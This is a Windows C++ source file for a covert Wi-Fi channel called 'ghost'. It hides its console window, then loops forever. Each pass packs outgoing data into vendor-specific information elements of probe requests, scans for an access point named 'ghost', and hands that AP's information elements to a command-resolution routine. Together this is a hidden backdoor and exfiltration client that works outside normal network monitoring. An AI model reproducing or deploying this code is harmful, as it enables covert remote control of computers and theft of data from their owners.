#ifndef UNICODE
#define UNICODE
#endif
#include "stdafx.h"
#include <windows.h>
#include <wlanapi.h>
#include <objbase.h>
#include <wtypes.h>
#include "ghost.h"
#include <stdio.h>
#include <stdlib.h>
#include "Action_Abs.h"
#include "Action.h"
// Need to link with Wlanapi.lib and Ole32.lib
#pragma comment(lib, "wlanapi.lib")	//表示链接wlanapi.lib这个库
#pragma comment(lib, "ole32.lib")

//封装payload

PWLAN_RAW_DATA get_payload(char *buf){

	//结构体初始化内存
	HLOG("[INFO]Send Context is :%s\n", buf);
	int len = strlen(buf) + 1;	//len为数据长度，+1个结束符
	int response_len = sizeof(DWORD)  + sizeof(struct ie_data)-1  + len;//!!4+2+8  14,因为每个结构体都包含了一个具体的内容，占1字节
	char *response = (char *)malloc(response_len);//开辟存储空间
	memset(response, '\0', response_len);//全部填充为'\0'
	//定义两个指针
	PWLAN_RAW_DATA pwlan_data = (PWLAN_RAW_DATA)response;
	struct ie_data *piedata = (struct ie_data *)&pwlan_data->DataBlob[0];
	//写数据包
	pwlan_data->dwDataSize = sizeof(struct ie_data) - 1 + len;
	piedata->id = (char)221;
	piedata->len = len;
	memcpy(&piedata->val[0], buf, len);
	return pwlan_data;
}

//获取句柄
DWORD get_Handle(HANDLE *hClient, DWORD dwMaxClient,DWORD dwCurVersion){
	//dwMaxClient 为客户端支持的WLANAPI的最高版本，dwCurVersion 为这次会话中将会使用的版本

	DWORD dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, hClient);//打开一个与服务器的连接（打开wlan句柄）
	//HLOG("WlanOpenHandle failed with error: %u\n", dwResult);
	if (dwResult != ERROR_SUCCESS) {
		HLOG("【ERROR】WlanOpenHandle failed with error: %u\n", dwResult);
	}
	return dwResult;
}

//查询网卡列表
DWORD get_WlanList(HANDLE *hClient, PWLAN_INTERFACE_INFO_LIST *pIfList ) {
	if (*pIfList != NULL) {	//清空列表
		WlanFreeMemory(*pIfList);
		*pIfList = NULL;
	}
	DWORD dwResult = WlanEnumInterfaces(*hClient, NULL, pIfList);//枚举所有在本地计算机上当前启用的无线LAN接口
	if (dwResult != ERROR_SUCCESS) {
		HLOG("【ERROR】WlanEnumInterfaces failed with error: %u\n", dwResult);
	}
	return dwResult;
}

//查询网卡状态
PWLAN_INTERFACE_INFO get_Wlan(PWLAN_INTERFACE_INFO_LIST *pIfList) {
	PWLAN_INTERFACE_INFO pIfInfo = NULL;
	WCHAR GuidString[40] = { 0 };
	HLOG("[INFO]Interface Information：\n");
	HLOG("  Numbers of Interface: %lu\n", (*pIfList)->dwNumberOfItems);//打印wlan项目数
	HLOG("  Current Index: %lu\n", (*pIfList)->dwIndex);//打印当前索引
	for (int i = 0; i < (int)(*pIfList)->dwNumberOfItems; i++) {
		pIfInfo = (WLAN_INTERFACE_INFO *)&(*pIfList)->InterfaceInfo[i];
		HLOG("  Interface Index[%d]:\t %lu\n", i, i);
		int iRet = StringFromGUID2((pIfInfo)->InterfaceGuid, (LPOLESTR)&GuidString, 39);//打印GUID
		if (iRet == 0)
			HLOG("StringFromGUID2 failed\n");
		else {
			HLOG("  InterfaceGUID[%d]: %ws\n", i, GuidString);
		}
		HLOG("  Interface Description[%d]: %ws", i,
			(pIfInfo)->strInterfaceDescription);//打印描述
		HLOG("\n");
		HLOG("  Interface State[%d]:\t ", i);//打印状态
		switch ((pIfInfo)->isState) {
		case wlan_interface_state_not_ready:
			HLOG("Not ready\n");
			break;
		case wlan_interface_state_connected:
			HLOG("Connected\n");
			break;
		case wlan_interface_state_ad_hoc_network_formed:
			HLOG("First node in a ad hoc network\n");
			break;
		case wlan_interface_state_disconnecting:
			HLOG("Disconnecting\n");
			break;
		case wlan_interface_state_disconnected:
			HLOG("Not connected\n");
			break;
		case wlan_interface_state_associating:
			HLOG("Attempting to associate with a network\n");
			break;
		case wlan_interface_state_discovering:
			HLOG("Auto configuration is discovering settings for the network\n");
			break;
		case wlan_interface_state_authenticating:
			HLOG("In process of authenticating\n");
			break;
		default:
			HLOG("Unknown state %ld\n", (pIfInfo)->isState);
			break;
		}
	}
	return pIfInfo;//默认采用返回最后一个网卡信息
}

//发送探针
DWORD sendRequest(HANDLE *hClient, PWLAN_INTERFACE_INFO *pIfInfo, char *ssid, PWLAN_RAW_DATA pwlan_data){
	//ssid 为需要搜索的SSID名称，pwlan_data 为封装的payload

	//PDOT11_SSID pdo = new DOT11_SSID;  //存储ssid的结构体
	//pdo->uSSIDLength = strlen(ssid); //获取ssid的长度，放入结构体中.. ULONG类型
	//UCHAR *ucp = (UCHAR *)malloc(pdo->uSSIDLength + 1);	//开辟一个空间，长度位SSID的长度
	//memset(ucp, '\0', pdo->uSSIDLength + 1);	//ucp后面的uSSIDLength长度的空间用'\0'填充
	//strcpy((char*)ucp, ssid);//将ssid的值存入其中

	DWORD dwResult = WlanScan(*hClient, &(*pIfInfo)->InterfaceGuid, NULL, pwlan_data, NULL);//指定接口上进行网络扫描
	if (dwResult != ERROR_SUCCESS) {
		HLOG("【ERROR】Sending probe Request with error: %u\n", dwResult);
	}
	else {
		HLOG("[INFO]Sending probe Request...\n");
	}
	//free(pdo);  //释放空间
	return dwResult;
}

//获取回复信息
boolean getInfomation(HANDLE *hClient, PWLAN_INTERFACE_INFO *pIfInfo, WLAN_AVAILABLE_NETWORK *pBssEntry,Action_Abs *action) {
	PWLAN_BSS_LIST ppWlanBssList;	
	DWORD dwResult2 = WlanGetNetworkBssList(*hClient, &(*pIfInfo)->InterfaceGuid,//检索一个给定的无线LAN接口上的无线网络或网络的基本服务集（BSS）的条目的列表
		&pBssEntry->dot11Ssid,
		pBssEntry->dot11BssType,
		pBssEntry->bSecurityEnabled,
		NULL,
		&ppWlanBssList);
	boolean GetInfoOK_STATUS = false;
	HLOG("%d", ppWlanBssList->dwNumberOfItems);
	for (int z = 0; z < ppWlanBssList->dwNumberOfItems; z++)
	{
		WLAN_BSS_ENTRY *bss_entry = &ppWlanBssList->wlanBssEntries[z];

		HLOG("========\nUSSID： %s\n", bss_entry->dot11Ssid.ucSSID);
		//HLOG("信号强度：%d\n", bss_entry->lRssi);

		char *pp = (char *)((unsigned long)bss_entry + bss_entry->ulIeOffset);//信息元素的位置
		int total_size = bss_entry->ulIeSize;
		//HLOG("长度：%d",total_size);
		GetInfoOK_STATUS = action->ResolutionCMD(pp, total_size);
	}//for
	return GetInfoOK_STATUS;	//如果存在多个BSS集，猜想会出现bug!!!!
}

//获取附近AP,寻找特殊的AP
boolean getssid(HANDLE *hClient, PWLAN_INTERFACE_INFO *pIfInfo, char *ssid, Action_Abs *action) {
	PWLAN_AVAILABLE_NETWORK_LIST pBssList = NULL; //附近网络信息列表

	DWORD dwResult = WlanGetAvailableNetworkList(*hClient, &(*pIfInfo)->InterfaceGuid, 0, NULL, &pBssList);//获取无线LAN接口上的可用网络列表
	WLAN_AVAILABLE_NETWORK* pBssEntry = NULL;
	boolean ExcuteCmdOK = FALSE;
	bool findAP = false;
	if (dwResult != ERROR_SUCCESS) {
		HLOG("【ERROR】WlanGetAvailableNetworkList failed with error: %u\n", dwResult);
	}
	else {
		HLOG("[INFO]Numbers of AP: %lu\n", (pBssList)->dwNumberOfItems);//打印AP的个数
		for (int j = 0; j < (pBssList)->dwNumberOfItems; j++) {	//搜索每个AP的名称，并进行比较
			pBssEntry = (WLAN_AVAILABLE_NETWORK *)& (pBssList)->Network[j];
			HLOG("(%d):%s   ", j, (char *)pBssEntry->dot11Ssid.ucSSID);
			if (_stricmp((char *)pBssEntry->dot11Ssid.ucSSID, ssid) == 0) {
				findAP = TRUE;
				break;
			}
		}
	}
	
	if(findAP){
		HLOG("\n[INFO]Find Server!\n");
		ExcuteCmdOK = getInfomation(hClient, pIfInfo, pBssEntry, action);
	}
	else {
		HLOG("\n[INFO]Searching Server...\n");
	}

	if (pBssList != NULL) {
		WlanFreeMemory(pBssList);
		pBssList = NULL;
	}
	return ExcuteCmdOK;
}

int main()
{
#ifndef __DEBUG__
	ShowWindow(GetConsoleWindow(), SW_HIDE);
#endif

	HANDLE hClient = NULL;//指定wlan客户端在会话中使用的句柄，这个句柄会贯穿整个会话被其他函数使用
	PWLAN_INTERFACE_INFO_LIST pIfList = NULL; //指向存储 本地计算机启用的无线LAN接口 的指针
	PWLAN_INTERFACE_INFO pIfInfo = NULL;//网卡信息

	struct STATUS_WLAN status_wlan = {-1,-1,-1};//定义状态变量，目的是在报错情况下可以重复执行之前的命令，目前没有使用~

	Action_Abs *action =new Action_1();

	char *ssid = "ghost";
	
	if (status_wlan.STATUS_handle != 0) {
		status_wlan.STATUS_handle = get_Handle(&hClient, 2, 0);
	}
	if (status_wlan.STATUS_wlanList != 0) {
		status_wlan.STATUS_wlanList = get_WlanList(&hClient, &pIfList);
		pIfInfo = get_Wlan(&pIfList);
	}

	while (true) {
		HLOG("----NEW-----\n");
		status_wlan.STATUS_sendRequest = sendRequest(&hClient, &pIfInfo, NULL, get_payload(action->get_sendInfo()));
		getssid(&hClient, &pIfInfo, ssid, action);
		HLOG("----OVER----\n\n\n");
		Sleep(1000);
	}
	return 0;
}
